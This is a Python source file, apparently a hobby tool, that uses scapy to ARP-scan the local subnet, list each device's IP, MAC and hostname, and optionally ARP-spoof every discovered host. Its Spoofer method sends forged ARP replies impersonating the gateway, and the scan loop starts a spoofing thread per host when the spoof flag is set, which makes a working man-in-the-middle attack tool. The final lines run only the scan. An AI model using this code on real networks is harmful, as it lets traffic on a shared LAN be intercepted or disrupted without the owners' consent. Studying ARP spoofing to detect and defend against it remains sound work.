from ipaddress import IPv4Network

import scapy.all as scapy
from socket import gethostbyaddr
from time import time
from threading import Thread
from netifaces import gateways, AF_INET, ifaddresses


class ArpSpoofing:
    def __init__(self, ip_range: str = None, spoof: bool = False, gethostname: bool = False, ):
        self.sp = scapy
        if ip_range:
            self.ip_range = ip_range
        else:
            self.ip_range = self.__Get_NetWork_Range()
        self.spoof = spoof

        self.GatewayAddr = self.__getGatewayAddress()
        self.gethostname = gethostname

    def echoResult(self, answered: list):
        raise NotImplementedError

    @property
    def __getRunningIface(self):
        return self.sp.get_working_if()

    def __get_netmask_for_running_iface(self):
        return ifaddresses(self.__getRunningIface).get(2)[0].get('netmask')

    def __getGatewayAddress(self):
        gw = gateways().get('default' or None).get(AF_INET)[0]
        if gw:
            return gw

    def __Get_NetWork_Range(self):
        cidr = self.__get_netmask_for_running_iface()
        gateway = self.__getGatewayAddress()
        return IPv4Network(f"{gateway}/{cidr}", strict=False)

    def Spoofer(self, des_ip: str, des_mac: str, real_gateway: str) -> None:
        """
        >>> obj = ArpSpoofing()
        >>> obj.Spoofer("192.168.1.10","aa:aa:aa:aa:aa:aa","192.168.1.1")
        spoof network using arp response to fake the gateway mac address
        :param des_ip: target ip to send faked arp response to
        :param des_mac: target mac to send faked arp response to
        :param real_gateway: the real gateway address
        :return:
        """
        packet = self.sp.ARP(op=2, pdst=des_ip, hwdst=des_mac, psrc=real_gateway)
        self.sp.send(packet, verbose=False)
        print("Spoofed Successfully")

    def MakeArpRequest(self):
        if self.ip_range:
            return self.sp.ARP(pdst=self.ip_range)

    def MakeEtherFrame(self):
        return self.sp.Ether(dst='ff:ff:ff:ff:ff:ff')

    def MakeArpBroadCast(self):
        return self.MakeEtherFrame() / self.MakeArpRequest()

    def scan(self) -> None:
        """
        Scans network range using arp request
        :param ip_range: a network range to scan using scapy.ARP
        :return: None
        """
        start_time = time()

        answered, un = self.sp.srp(self.MakeArpBroadCast(), timeout=1, verbose=False)
        print()
        for element in answered:
            if self.spoof:
                Thread(target=self.Spoofer, args=(element[1].psrc, element[1].hwsrc, self.GatewayAddr)).start()
            print(F"IP: {element[1].psrc} Mac: {element[1].hwsrc}")
            try:
                print(f"Hostname: {gethostbyaddr(element[1].psrc)[0]}")
            except:
                pass
            print('-' * 40)
        print(
            f"Interface: {self.__getRunningIface}"
            f"\nNetwork Address: {self.__Get_NetWork_Range()}"
            f"\nTotal discovered devices: {len(answered)}"
            f"\nTaken Time: {round(time() - start_time, 2)}s")


arp = ArpSpoofing(spoof=False)
arp.scan()
